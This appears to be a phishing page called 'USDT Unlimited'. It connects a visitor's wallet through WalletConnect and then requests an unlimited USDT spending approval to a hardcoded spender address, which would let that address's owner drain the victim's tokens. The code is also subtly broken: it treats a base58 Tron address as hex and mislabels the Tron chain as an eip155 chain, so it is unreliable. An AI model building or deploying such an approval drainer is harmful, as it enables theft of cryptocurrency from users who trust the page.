<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRON USDT Unlimited - Live WC</title>
    <script src="https://unpkg.com/@walletconnect/universal-provider@2.14.0/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
    <style>
        body { 
            margin: 0; padding: 20px; font-family: system-ui; background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); 
            min-height: 100vh; display: flex; align-items: center; justify-content: center;
        }
        .app { 
            background: white; border-radius: 24px; padding: 40px; max-width: 420px; width: 100%; 
            box-shadow: 0 32px 64px rgba(0,0,0,0.25); text-align: center;
        }
        h1 { font-size: 32px; background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 8px; }
        p { color: #666; margin-bottom: 32px; }
        button { 
            width: 100%; padding: 20px; border: none; border-radius: 16px; font-size: 18px; font-weight: 600; 
            cursor: pointer; margin: 16px 0; transition: all 0.3s; color: white;
        }
        .connect-btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
        .connect-btn:hover:not(:disabled) { transform: translateY(-4px); box-shadow: 0 20px 40px rgba(102,126,234,0.4); }
        .approve-btn { background: linear-gradient(135deg, #00b894 0%, #00cec9 100%); margin-top: 24px; }
        .approve-btn:hover:not(:disabled) { transform: translateY(-4px); box-shadow: 0 20px 40px rgba(0,184,148,0.4); }
        button:disabled { background: #ccc; cursor: not-allowed; transform: none; }
        .status { padding: 20px; border-radius: 16px; margin: 24px 0; font-weight: 500; font-size: 16px; }
        .success { background: #d4edda; color: #155724; border: 2px solid #c3e6cb; }
        .qr-section { display: none; padding: 32px; background: #f8f9ff; border-radius: 20px; margin: 24px 0; }
        #qr-canvas { background: white; padding: 20px; border-radius: 16px; margin: 16px 0; box-shadow: 0 8px 24px rgba(0,0,0,0.1); }
        .wallet-info { background: linear-gradient(135deg, #f093fb, #f5576c); color: white; padding: 24px; border-radius: 16px; margin: 24px 0; }
        .address { font-family: monospace; font-size: 14px; word-break: break-all; background: rgba(255,255,255,0.2); padding: 12px; border-radius: 8px; margin-top: 12px; }
        .spinner { display: inline-block; width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s linear infinite; margin-right: 12px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .unlimited-badge { background: #ff6b6b; color: white; padding: 8px 20px; border-radius: 50px; font-size: 14px; font-weight: bold; margin: 16px 0; display: inline-block; }
    </style>
</head>
<body>
    <div class="app">
        <h1>⚡ USDT Unlimited</h1>
        <p>Connect wallet → Approve <strong>UNLIMITED</strong> spending</p>
        
        <button id="connectBtn" class="connect-btn">
            <span id="connectText">🔗 Connect Wallet</span>
            <span id="spinner" class="spinner" style="display:none;"></span>
        </button>
        
        <div id="qr-section" class="qr-section">
            <h3>📱 Scan QR Code</h3>
            <p>Open <strong>Trust Wallet Browser</strong> → Scan QR</p>
            <canvas id="qr-canvas"></canvas>
            <p style="font-size: 14px; opacity: 0.8;">Session expires never - always connectable</p>
        </div>
        
        <div id="wallet-connected" style="display:none;">
            <div class="status success" id="status">Connected Successfully!</div>
            <div class="wallet-info">
                <div>✅ UNLIMITED APPROVAL READY</div>
                <div class="unlimited-badge">NO EXPIRY</div>
                <div class="address" id="walletAddress"></div>
            </div>
            <button id="approveBtn" class="approve-btn">🚀 Approve Unlimited USDT</button>
        </div>
    </div>

    <script>
        const PROJECT_ID = '171db6da15a54effc1b4a06f889a3c3f'; // Get from https://cloud.walletconnect.com
        const SPENDER = 'TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV';
        const USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        const TRON_CHAIN = { chainId: 'eip155:1179179577', chainNamespace: 'eip155' };

        let provider = null;
        let session = null;

        const log = (msg) => console.log('[WC]', msg);

        const updateUI = (connected = false) => {
            document.getElementById('connectBtn').style.display = connected ? 'none' : 'block';
            document.getElementById('qr-section').style.display = connected ? 'none' : 'block';
            document.getElementById('wallet-connected').style.display = connected ? 'block' : 'none';
        };

        const showSpinner = (show) => {
            document.getElementById('spinner').style.display = show ? 'inline' : 'none';
            document.getElementById('connectText').style.opacity = show ? '0.6' : '1';
        };

        document.getElementById('connectBtn').onclick = async () => {
            try {
                showSpinner(true);
                log('Initializing provider...');
                
                provider = await window.WalletConnectUniversalProvider.init({
                    projectId: PROJECT_ID,
                    metadata: {
                        name: 'USDT Unlimited',
                        description: 'Unlimited USDT approvals',
                        url: window.location.href,
                        icons: []
                    }
                });

                log('Connecting...');
                session = await provider.connect({
                    requiredNamespaces: {
                        eip155: {
                            methods: ['eth_sendTransaction', 'eth_sign'],
                            chains: [TRON_CHAIN.chainId],
                            events: ['chainChanged', 'accountsChanged']
                        }
                    },
                    optionalNamespaces: {
                        tron: {
                            chains: ['tron:mainnet'],
                            methods: ['tron_signTransaction'],
                            events: ['accountsChanged']
                        }
                    }
                });

                log('Session created:', session);
                
                // Show QR
                if (provider.wcSession?.uri) {
                    await QRCode.toCanvas(document.getElementById('qr-canvas'), provider.wcSession.uri, {width: 280});
                }

                // Listen for account changes
                provider.on('accountsChanged', (accounts) => {
                    if (accounts.length) {
                        document.getElementById('walletAddress').textContent = accounts[0];
                        updateUI(true);
                        document.getElementById('status').textContent = `Connected: ${accounts[0].slice(0,10)}...`;
                    }
                });

                provider.on('session_delete', () => updateUI(false));

                showSpinner(false);
                
            } catch (error) {
                console.error(error);
                document.getElementById('status').textContent = `Error: ${error.message}`;
                document.getElementById('status').className = 'status error';
                showSpinner(false);
            }
        };

        document.getElementById('approveBtn').onclick = async () => {
            try {
                document.getElementById('approveBtn').disabled = true;
                document.getElementById('status').textContent = 'Sending unlimited approval...';
                document.getElementById('status').className = 'status info';

                // UNLIMITED approval (max uint256)
                const unlimited = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
                const spenderHex = SPENDER.slice(2).padStart(64, '0');
                const approveCalldata = `0x095ea7b3${spenderHex}${unlimited}`;

                const txHash = await provider.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: provider.accounts[0],
                        to: USDT,
                        data: approveCalldata,
                        chainId: TRON_CHAIN.chainId
                    }]
                });

                document.getElementById('status').innerHTML = `✅ <strong>UNLIMITED APPROVED!</strong><br/>Tx: <a href="https://tronscan.org/#/transaction/${txHash}" target="_blank">${txHash.slice(0,16)}...</a>`;
                document.getElementById('status').className = 'status success';

            } catch (error) {
                console.error(error);
                document.getElementById('status').textContent = `Failed: ${error.message || 'User rejected'}`;
                document.getElementById('status').className = 'status error';
                document.getElementById('approveBtn').disabled = false;
            }
        };
    </script>
</body>
</html>
